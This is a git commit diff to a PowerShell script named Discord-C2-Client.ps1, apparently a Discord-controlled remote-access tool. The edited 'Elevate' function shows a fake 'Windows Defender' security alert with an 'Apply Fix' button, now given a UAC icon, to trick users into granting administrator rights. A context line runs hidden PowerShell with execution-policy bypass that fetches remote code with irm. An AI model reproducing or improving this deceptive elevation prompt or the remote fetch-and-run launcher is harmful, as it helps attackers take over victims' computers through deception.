b60faf73ff9fa5503c89d4d073b170e4125c8a37
egieb <93350544+beigeworm@users.noreply.github.com>
2024-11-29 08:16:09 +0000

    Update Discord-C2-Client.ps1

--- Discord-C2-Client.ps1
+++ Discord-C2-Client.ps1
@@ -798,7 +798,6 @@ Function Elevate{
     Add-Type -AssemblyName System.Drawing
     Add-Type -AssemblyName Microsoft.VisualBasic
     [System.Windows.Forms.Application]::EnableVisualStyles()
-    
     $errorForm = New-Object Windows.Forms.Form
     $errorForm.Width = 400
     $errorForm.Height = 180
@@ -809,7 +808,6 @@ Function Elevate{
     $icon = [System.Drawing.SystemIcons]::Information
     $errorForm.Icon = $icon
     $errorForm.FormBorderStyle = [System.Windows.Forms.FormBorderStyle]::FixedDialog
-    
     $label = New-Object Windows.Forms.Label
     $label.AutoSize = $false
     $label.Width = 380
@@ -817,11 +815,12 @@ Function Elevate{
     $label.TextAlign = 'MiddleCenter'
     $label.Text = "Windows Defender has found critical vulnerabilities`n`nWindows will now attempt to apply important security updates to automatically fix these issues in the background"
     $label.Location = New-Object System.Drawing.Point(10, 10)
-    
-    $shieldIcon = [System.Drawing.SystemIcons]::Shield.ToBitmap()
+    $icon = [System.Drawing.Icon]::ExtractAssociatedIcon("C:\Windows\System32\UserAccountControlSettings.exe")
+    $iconBitmap = $icon.ToBitmap()
     $resizedIcon = New-Object System.Drawing.Bitmap(16, 16)
     $graphics = [System.Drawing.Graphics]::FromImage($resizedIcon)
-    $graphics.DrawImage($shieldIcon, 0, 0, 16, 16)
+    $graphics.DrawImage($iconBitmap, 0, 0, 16, 16)
+    $graphics.Dispose()
     $okButton = New-Object Windows.Forms.Button
     $okButton.Text = "  Apply Fix"
     $okButton.Width = 110
@@ -829,15 +828,12 @@ Function Elevate{
     $okButton.Location = New-Object System.Drawing.Point(185, 110)
     $okButton.Image = $resizedIcon
     $okButton.TextImageRelation = 'ImageBeforeText'
-    
     $cancelButton = New-Object Windows.Forms.Button
     $cancelButton.Text = "Cancel "
     $cancelButton.Width = 80
     $cancelButton.Height = 25
     $cancelButton.Location = New-Object System.Drawing.Point(300, 110)
-    
     $errorForm.controls.AddRange(@($label, $okButton, $cancelButton))
-    
     $okButton.Add_Click({
         $errorForm.Close()
         $graphics.Dispose()
@@ -864,13 +860,11 @@ WshShell.Run `"powershell.exe -NonI -NoP -Ep Bypass -C `$tk='$token'; irm $paren
         }
         return                   
     })
-    
     $cancelButton.Add_Click({
         $errorForm.Close()
         $graphics.Dispose()
         return                    
     })
-    
     [void]$errorForm.ShowDialog()
 }
 
